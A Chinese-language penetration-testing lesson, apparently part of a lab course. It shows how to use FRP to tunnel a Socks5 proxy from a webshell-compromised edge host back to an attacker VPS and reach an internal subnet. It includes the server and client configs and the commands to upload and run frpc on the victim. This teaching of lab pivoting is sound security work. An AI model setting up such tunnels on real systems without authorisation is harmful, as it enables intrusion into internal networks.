在本节课中，我们将学习如何使用FRP工具建立Socks代理通道，实现内网穿透，以便访问和测试多层网络环境中的内部服务。

上一节我们通过一个多层网络靶场，介绍了Socks代理的基本概念和内网穿透的原理。我们利用Socks代理通道成功访问了内网服务。本节中，我们来看看两个具体的工具：FRP和EW。它们的核心思路和原理是相似的，主要目的是让大家理解其基本使用方法和操作流程。

## 场景回顾与需求分析

我们当前的场景是：通过外网Web服务的漏洞，获得了一台边界主机（TT1）的Webshell。这台主机具有双网卡，可以连通内网的 `192.168.22.0/24` 网段。我们发现该网段内存活主机 `192.168.22.2`，并希望对其进行深入测试（如端口扫描、服务探测）。

然而，在Webshell环境下操作受限，功能不全。因此，我们需要建立一个Socks代理通道，将内网 `192.168.22.0/24` 网段的流量代理出来，使我们本地的攻击工具能够直接访问该内网。

### 第一步：在VPS上配置FRP服务端

![](img/d924d878fa9d64d263084d2110a72810_26.png)

![](img/d924d878fa9d64d263084d2110a72810_28.png)

![](img/d924d878fa9d64d263084d2110a72810_30.png)

首先，在VPS上下载并配置FRP服务端。

![](img/d924d878fa9d64d263084d2110a72810_32.png)

![](img/d924d878fa9d64d263084d2110a72810_34.png)

![](img/d924d878fa9d64d263084d2110a72810_36.png)

1.  **下载FRP**：从GitHub Release页面下载对应系统（如Linux amd64）的编译好的FRP版本。
2.  **编写服务端配置文件**：创建一个配置文件，例如 `frps.ini`。
    ```ini
    [common]
    bind_port = 7000
    ```
    此配置表示服务端将在本地的 **7000** 端口监听来自客户端的连接。
3.  **启动服务端**：使用以下命令启动FRP服务端。
    ```bash
    ./frps -c ./frps.ini
    ```
    执行后，使用 `netstat -antp | grep 7000` 命令验证7000端口是否处于监听状态。

### 第二步：在内网主机上配置FRP客户端

![](img/d924d878fa9d64d263084d2110a72810_44.png)

![](img/d924d878fa9d64d263084d2110a72810_46.png)

![](img/d924d878fa9d64d263084d2110a72810_48.png)

接下来，在我们已获得Webshell的内网主机（TT1）上配置并运行FRP客户端。

1.  **上传客户端程序**：将FRP客户端程序（frpc）和配置文件上传到目标主机的一个目录，例如 `/tmp/frp/`。并赋予可执行权限。
    ```bash
    chmod +x frpc
    ```
2.  **编写客户端配置文件**：创建一个配置文件，例如 `frpc.ini`。
    ```ini
    [common]
    server_addr = your_vps_ip
    server_port = 7000

    [socks5_proxy]
    type = tcp
    plugin = socks5
    remote_port = 10088
    ```
    *   `server_addr` 和 `server_port`：指向VPS上FRP服务端的地址和端口。
    *   `[socks5_proxy]`：定义一个Socks5代理服务。
    *   `type`：通信协议，Socks5使用 **tcp**。
    *   `plugin`：指定插件为 **socks5**。
    *   `remote_port`：在VPS上开启的代理端口（例如 **10088**）。我们后续将通过访问VPS的这个端口来使用代理。
3.  **启动客户端**：在内网主机上执行以下命令，连接服务端。
    ```bash
    ./frpc -c ./frpc.ini
    ```
    如果连接成功，在VPS的服务端日志中会看到 `[socks5_proxy] start proxy success` 类似的成功信息。

### 第三步：验证与使用代理通道

客户端成功连接后，即可验证并使用代理。

![](img/d924d878fa9d64d263084d2110a72810_50.png)

1.  **验证端口**：在VPS上执行 `netstat -antp | grep 10088`，确认10088端口已处于监听状态。
2.  **配置代理**：在本地的渗透测试工具（如浏览器、Nmap、Metasploit）中，配置Socks5代理。
    *   代理服务器：你的VPS公网IP
    *   代理端口：**10088**
3.  **测试访问**：配置完成后，尝试访问内网IP `192.168.22.2`。此时，流量将通过VPS的10088端口，经由FRP建立的通道，转发到内网主机，最终到达目标 `192.168.22.2`，实现访问。

## 核心概念与命令总结 📝

![](img/d924d878fa9d64d263084d2110a72810_64.png)

![](img/d924d878fa9d64d263084d2110a72810_66.png)

![](img/d924d878fa9d64d263084d2110a72810_68.png)

![](img/d924d878fa9d64d263084d2110a72810_70.png)

*   **FRP架构**：**C/S架构**，`frps`（服务端）部署在公网VPS，`frpc`（客户端）部署在内网主机。
*   **核心配置**：
    *   服务端 (`frps.ini`)：定义监听端口 `bind_port`。
    *   客户端 (`frpc.ini`)：指定服务端地址(`server_addr`)、端口(`server_port`)，并定义代理类型（如 `socks5`）和VPS侧的代理入口端口(`remote_port`)。
*   **关键命令**：
    ```bash
    # 启动服务端
    ./frps -c frps.ini
    # 启动客户端
    ./frpc -c frpc.ini
    ```
